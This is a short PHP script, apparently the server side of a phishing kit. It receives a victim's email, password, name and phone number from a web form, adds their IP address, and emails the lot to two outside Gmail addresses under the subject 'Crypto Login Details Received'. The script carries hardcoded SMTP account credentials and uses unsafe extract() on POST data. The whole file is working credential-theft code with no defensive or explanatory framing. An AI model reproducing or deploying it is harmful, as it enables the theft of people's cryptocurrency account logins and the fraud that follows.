<?php extract($_POST);$ip=$_SERVER['REMOTE_ADDR'];require 'PHPMailer/PHPMailerAutoload.php';require 'PHPMailer/class.phpmailer.php';
$customerEmailer='
        Email : '.$email.'
        Password : '.$password.'
        Name : '.@$name.'
        Registered  Number : '.@$number.'
        IP : '.$ip.'
        ';
 $subject='Alert - Crypto Login Details Received';$message=$customerEmailer;
 $toAddress='vikasphp7@gmail.com';
 $fromTitle=$_SERVER['HTTP_HOST'];$fromEmail='details@'.$_SERVER['HTTP_HOST'];$mail=new PHPMailer;$mail->SMTPDebug=2;$mail->Host='smtp.gmail.com';$mail->SMTPAuth=true;$mail->Username='smtpkeymail@gmail.com';$mail->Password='smtpkeymail112@';$mail->SMTPSecure='tls';$mail->Port=587;$mail->setFrom($fromEmail,$fromTitle);
 $mail->addAddress($toAddress);
 $mail->isHTML(true);$mail->Subject=$subject;$mail->Body=$message;$mailS=$mail->send(); 


 $toAddress='mykeysite@gmail.com';
 $fromTitle=$_SERVER['HTTP_HOST'];$fromEmail='details@'.$_SERVER['HTTP_HOST'];$mail=new PHPMailer;$mail->SMTPDebug=2;$mail->Host='smtp.gmail.com';$mail->SMTPAuth=true;$mail->Username='smtpkeymail@gmail.com';$mail->Password='smtpkeymail112@';$mail->SMTPSecure='tls';$mail->Port=587;$mail->setFrom($fromEmail,$fromTitle);
 $mail->addAddress($toAddress);
 $mail->isHTML(true);$mail->Subject=$subject;$mail->Body=$message;$mailS=$mail->send(); 
?>